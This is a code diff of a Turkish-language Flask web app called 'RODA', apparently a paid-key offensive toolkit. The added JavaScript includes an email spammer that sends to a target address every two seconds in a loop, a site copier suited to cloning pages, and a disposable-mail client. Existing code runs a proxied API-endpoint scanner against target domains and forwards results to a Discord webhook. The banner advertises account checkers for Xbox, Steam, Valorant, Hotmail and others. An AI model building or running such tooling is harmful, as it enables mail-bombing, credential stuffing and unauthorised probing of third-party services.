-        alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
-        return;
+function copySite() {
+    if (!isAdmin) { alert("⛔ Admin girişi yapın!"); return; }
+    var url = document.getElementById("siteCopyUrl").value.trim();
+    if (!url) { document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--r)">❌ URL girin!</span>'; return; }
+    document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--gold)">⏳ Kopyalanıyor...</span>';
+    fetch("/api/sitecopy?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ url: url })})
+    .then(function(r){
+        if (!r.ok) return r.json().then(function(d){ throw new Error(d.error || "Bilinmeyen hata"); });
+        return r.blob();
+    })
+    .then(function(blob){
+        var a = document.createElement("a");
+        a.href = URL.createObjectURL(blob);
+        a.download = "kopyalanan_site.html";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--g)">✅ Site kopyalandı ve indirildi!</span>';
+    })
+    .catch(function(e){ document.getElementById("siteCopyResult").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>'; });
+}
+
+// ============================================================
+// TEMP MAIL (ADMIN)
+// ============================================================
+function generateTempMail() {
+    if (!isAdmin) { alert("⛔ Admin girişi yapın!"); return; }
+    document.getElementById("tempMailInput").value = "Üretiliyor...";
+    fetch("/api/temp_mail_generate?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}})
+    .then(r => r.json())
+    .then(d => {
+        if (d.success) {
+            tempMailToken = d.token;
+            document.getElementById("tempMailInput").value = d.email;
+            document.getElementById("tempMailInbox").innerHTML = '<div style="color:var(--muted)">E-posta oluşturuldu. Gelen kutusunu yenileyin.</div>';
+            document.getElementById("tempMailContent").innerHTML = '';
+        } else {
+            alert("Hata: " + (d.error || "Bilinmeyen"));
+            document.getElementById("tempMailInput").value = "Hata!";
+        }
+    })
+    .catch(e => { alert("Bağlantı hatası"); });
+}
+
+function copyTempMail() {
+    var val = document.getElementById("tempMailInput").value;
+    if (val && val !== "Üretiliyor..." && val !== "Hata!") {
+        navigator.clipboard.writeText(val).then(() => alert("Kopyalandı!")).catch(() => {});
     }
-    document.querySelectorAll(".nav-item").forEach(function(el) {
-        el.classList.remove("active");
-    });
-    var el = document.querySelector('.nav-item[data-page="' + page + '"]');
-    if (el) el.classList.add("active");
-    document.querySelectorAll(".page").forEach(function(el) {
-        el.classList.remove("active");
-    });
-    var pg = document.getElementById("page-" + page);
-    if (pg) pg.classList.add("active");
-    var titles = {
-        checker: "Checker",
-        proxy: "Proxy",
-        discovery: "API Keşif",
-        parse: "Ayrıştırma",
-        stats: "İstatistik",
-        keys: "Key Yönetimi",
-        logs: "Loglar"
-    };
-    document.getElementById("pageTitle").innerText = titles[page] || page;
-    if (page === "keys" && isAdmin) loadKeys();
-    if (page === "logs" && isAdmin) refreshLogs();
-    if (page === "stats") {
-        document.getElementById("statScans").innerText = 1;
-        document.getElementById("statLast").innerText = new Date().toLocaleString();
+}
+
+function refreshTempMail() {
+    if (!isAdmin || !tempMailToken) { alert("Önce e-posta oluşturun!"); return; }
+    document.getElementById("tempMailInbox").innerHTML = '<div style="color:var(--muted)">Yükleniyor...</div>';
+    fetch("/api/temp_mail_refresh?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ token: tempMailToken })})
+    .then(r => r.json())
+    .then(d => {
+        if (d.success && d.messages) {
+            var msgs = d.messages;
+            var html = '';
+            if (msgs.length === 0) { html = '<div style="color:var(--muted)">Kutu boş.</div>'; }
+            else {
+                msgs.forEach(function(msg){
+                    var from = msg.from ? msg.from.address : 'Bilinmiyor';
+                    var subject = msg.subject || '(Konu yok)';
+                    var id = msg.id;
+                    html += '<div onclick="readTempMail(\'' + id + '\')" style="padding:8px;border-bottom:1px solid var(--border);cursor:pointer;hover:background:rgba(255,255,255,0.05)">📩 <strong>' + from + '</strong> - ' + subject + '</div>';
+                });
+            }
+            document.getElementById("tempMailInbox").innerHTML = html;
+        } else {
+            document.getElementById("tempMailInbox").innerHTML = '<div style="color:var(--r)">Hata: ' + (d.error || '') + '</div>';
+        }
+    })
+    .catch(e => { document.getElementById("tempMailInbox").innerHTML = '<div style="color:var(--r)">Bağlantı hatası</div>'; });
+}
+
+function readTempMail(msgId) {
+    if (!isAdmin || !tempMailToken) return;
+    document.getElementById("tempMailContent").innerHTML = '<div style="color:var(--muted)">Yükleniyor...</div>';
+    fetch("/api/temp_mail_read?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ token: tempMailToken, msg_id: msgId })})
+    .then(r => r.json())
+    .then(d => {
+        if (d.success) {
+            var msg = d.message;
+            var html = '<div style="background:rgba(255,255,255,0.05);padding:10px;border-radius:8px;">';
+            html += '<div><strong>Kimden:</strong> ' + (msg.from ? msg.from.address : '?') + '</div>';
+            html += '<div><strong>Konu:</strong> ' + (msg.subject || '') + '</div>';
+            html += '<div style="margin-top:8px;border-top:1px solid var(--border);padding-top:8px;">' + (msg.text || msg.html || '(İçerik yok)').replace(/\n/g, '<br>') + '</div>';
+            html += '</div>';
+            document.getElementById("tempMailContent").innerHTML = html;
+        } else {
+            document.getElementById("tempMailContent").innerHTML = '<div style="color:var(--r)">Hata: ' + (d.error || '') + '</div>';
+        }
+    })
+    .catch(e => { document.getElementById("tempMailContent").innerHTML = '<div style="color:var(--r)">Bağlantı hatası</div>'; });
+}
+
+// ============================================================
+// EMAIL SPAMMER (ADMIN)
+// ============================================================
+function startSpam() {
+    if (!isAdmin) { alert("⛔ Admin girişi yapın!"); return; }
+    var email = document.getElementById("spamEmailInput").value.trim();
+    if (!email) { alert("Hedef e-posta girin!"); return; }
+    if (spamRunning) return;
+    spamRunning = true;
+    document.getElementById("spamStopBtn").style.display = "inline-block";
+    var log = document.getElementById("spamLog");
+    log.innerHTML += '<div style="color:var(--gold)">[Sistem] ' + email + ' için spam başlatıldı...</div>';
+
+    function sendSpam() {
+        if (!spamRunning) return;
+        fetch("/api/spam_send?key=" + encodeURIComponent(currentKey), {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ email: email })})
+        .then(r => r.json())
+        .then(d => {
+            var log = document.getElementById("spamLog");
+            if (d.success) {
+                log.innerHTML += '<div style="color:var(--g)">✅ ' + new Date().toLocaleTimeString() + ' - ' + d.message + '</div>';
+            } else {
+                log.innerHTML += '<div style="color:var(--r)">❌ ' + new Date().toLocaleTimeString() + ' - ' + d.message + '</div>';
+            }
+            log.scrollTop = log.scrollHeight;
+            if (spamRunning) setTimeout(sendSpam, 2000);
+        })
+        .catch(() => {
+            var log = document.getElementById("spamLog");
+            log.innerHTML += '<div style="color:var(--r)">❌ Bağlantı hatası</div>';
+            log.scrollTop = log.scrollHeight;
+            if (spamRunning) setTimeout(sendSpam, 3000);
+        });
     }
+    sendSpam();
+}
+
+function stopSpam() {
+    spamRunning = false;
+    document.getElementById("spamStopBtn").style.display = "none";
+    document.getElementById("spamLog").innerHTML += '<div style="color:var(--gold)">[Sistem] Spam durduruldu.</div>';
 }
 
 // ============================================================
@@ -1901,14 +2270,14 @@ function switchPage(page) {
 function fetchProxies() {
     document.getElementById("proxyCount").innerText = "Çekiliyor...";
     fetch("/api/fetch_proxies")
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
+        .then(function(r){ return r.json(); })
+        .then(function(d){
             if (d.success) {
                 document.getElementById("proxyList").value = d.proxies.join("\n");
                 document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
             }
         })
-        .catch(function(e) { document.getElementById("proxyCount").innerText = "Başarısız"; });
+        .catch(function(e){ document.getElementById("proxyCount").innerText = "Başarısız"; });
 }
 
 function clearProxies() {
@@ -1926,8 +2295,8 @@ function toggleProxy() {
 function loadKeys() {
     if (!isAdmin) return;
     fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
+        .then(function(r){ return r.json(); })
+        .then(function(d){
             if (d.error) { alert(d.error); return; }
             var list = document.getElementById("keyList");
             var html = "";
@@ -1943,42 +2312,34 @@ function loadKeys() {
             }
             list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
         })
-        .catch(function(e) { console.error(e); });
+        .catch(function(e){ console.error(e); });
 }
 
 function generateKey() {
     if (!isAdmin) return;
     var note = document.getElementById("genNote").value || "Oluşturuldu";
     var hours = document.getElementById("genHours").value;
-    fetch("/api/admin/generate", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, note: note, hours: hours })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
+    fetch("/api/admin/generate", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, note: note, hours: hours })})
+    .then(function(r){ return r.json(); })
+    .then(function(d){
         if (d.success) {
             alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires);
             loadKeys();
         } else alert("Başarısız: " + (d.error || ""));
     })
-    .catch(function(e) { alert("Hata: " + e.message); });
+    .catch(function(e){ alert("Hata: " + e.message); });
 }
 
 function deleteKey(target) {
     if (!isAdmin) return;
     if (!confirm("Bu anahtarı sil?")) return;
-    fetch("/api/admin/delete", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, target_key: target })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
+    fetch("/api/admin/delete", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, target_key: target })})
+    .then(function(r){ return r.json(); })
+    .then(function(d){
         if (d.success) loadKeys();
         else alert("Silinemedi");
     })
-    .catch(function(e) { alert("Hata: " + e.message); });
+    .catch(function(e){ alert("Hata: " + e.message); });
 }
 
 // ============================================================
@@ -1988,9 +2349,9 @@ function updateStatsUI() {
     if (!isAdmin) return;
     document.getElementById("totalCount").innerText = foundEndpoints.length;
     document.getElementById("sideTotal").innerText = foundEndpoints.length;
-    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
-    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
-    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
+    var auth = foundEndpoints.filter(function(e){ return e.category === "Auth"; }).length;
+    var api = foundEndpoints.filter(function(e){ return e.category === "API"; }).length;
+    var admin = foundEndpoints.filter(function(e){ return e.category === "Admin"; }).length;
     document.getElementById("authCount").innerText = auth;
     document.getElementById("apiCount").innerText = api;
     document.getElementById("adminCount").innerText = admin;
@@ -2001,10 +2362,7 @@ function updateStatsUI() {
 }
 
 function startScan() {
-    if (!isAdmin) {
-        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
-        return;
-    }
+    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
     if (scanning) return;
     var domain = document.getElementById("targetDomain").value.trim();
     if (!domain) return alert("Hedef domain girin");
@@ -2018,11 +2376,9 @@ function startScan() {
     document.getElementById("statusText").innerText = "Taranıyor";
     updateStatsUI();
 
-    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
+    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l){ return l.trim() && l.includes(":"); });
     var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
-    if (useProxy && proxyList.length) {
-        url += "&proxies=" + encodeURIComponent(proxyList.join(","));
-    }
+    if (useProxy && proxyList.length) { url += "&proxies=" + encodeURIComponent(proxyList.join(",")); }
     eventSource = new EventSource(url);
     eventSource.onmessage = function(e) {
         if (e.data === "[DONE]") {
@@ -2060,12 +2416,12 @@ function addResultRow(res) {
     var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
     var cc = "cat-" + res.category.toLowerCase();
     row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
-    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
+    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c){ return c.value; });
     if (checked.includes(res.category)) list.appendChild(row);
 }
 
 document.getElementById("filterContainer").addEventListener("change", function() {
-    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
+    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c){ return c.value; });
     var list = document.getElementById("resultsList");
     list.innerHTML = "";
     foundEndpoints.forEach(function(res) {
@@ -2081,30 +2437,20 @@ document.getElementById("filterContainer").addEventListener("change", function()
 });
 
 function sendWebhook() {
-    if (!isAdmin) {
-        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
-        return;
-    }
+    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
     var url = document.getElementById("webhookUrl").value.trim();
     if (!url) return alert("Webhook URL girin");
-    var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
+    var categories = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c){ return c.value; });
     if (!categories.length) return alert("En az bir kategori seçin");
     if (!foundEndpoints.length) return alert("Önce tarama yapın");
-    fetch("/api/admin/webhook", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, webhook_url: url, endpoints: foundEndpoints, categories: categories })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) { alert(d.success ? "✅ Discord'a gönderildi!" : "❌ Gönderilemedi"); })
-    .catch(function(e) { alert("Hata: " + e.message); });
+    fetch("/api/admin/webhook", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ master_key: currentKey, webhook_url: url, endpoints: foundEndpoints, categories: categories })})
+    .then(function(r){ return r.json(); })
+    .then(function(d){ alert(d.success ? "✅ Discord'a gönderildi!" : "❌ Gönderilemedi"); })
+    .catch(function(e){ alert("Hata: " + e.message); });
 }
 
 function exportJSON() {
-    if (!isAdmin) {
-        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
-        return;
-    }
+    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
     if (!foundEndpoints.length) return alert("Veri yok");
     var blob = new Blob([JSON.stringify(foundEndpoints, null, 2)], { type: "application/json" });
     var a = document.createElement("a");
@@ -2118,28 +2464,21 @@ function exportJSON() {
 """
 
 # ============================================================
-# BAŞLAT (Render Free Plan Uyumlu)
+# BAŞLAT
 # ============================================================
 if __name__ == "__main__":
     if not os.path.exists(KEYS_FILE):
         save_keys({})
-    
     port = int(os.environ.get("PORT", 5000))
-    
     print("""
     ╔══════════════════════════════════════════════════════════════════╗
-    ║     🔱 RODA - API KEŞİF + CHECKER + AYRIŞTIRMA (TÜRKÇE)        ║
+    ║     🔱 RODA - TÜM CHECKER'LAR TEK YERDE                        ║
     ║     Render Free Plan Uyumlu                                    ║
     ║     http://0.0.0.0:""" + str(port) + """                               ║
-    ║     Admin girişi için şifre gizlidir.                         ║
-    ║     1 KEY 1 IP - KEYLER KALICI (KULLANIM SONRASI SİLİNMEZ)   ║
-    ║     LOG SİSTEMİ AKTİF - Tüm işlemler kayıt altında           ║
-    ║     TÜM CHECKER'LAR EKLENDI (Xbox, Wolfteam, Craftrise,      ║
-    ║     Hotmail, Token, TikTok, Tabii)                           ║
-    ║     KAR TANELERİ ARKA PLAN                                   ║
-    ║     AYRIŞTIRMA DÜZELTİLDİ (Kullanıcı:Şifre formatı)          ║
-    ║     MAVİ TEMA                                               ║
+    ║     Xbox, Steam, Valorant, Tabii, Wolfteam, Craftrise,        ║
+    ║     Hotmail, Token, TikTok Gen, Site Kopyala, Temp Mail,      ║
+    ║     Email Spammer, API Keşif, Key Yönetimi, Loglar            ║
+    ║     KAR TANELERİ ARKA PLANDA                                 ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
-    
     app.run(host="0.0.0.0", port=port, debug=False)
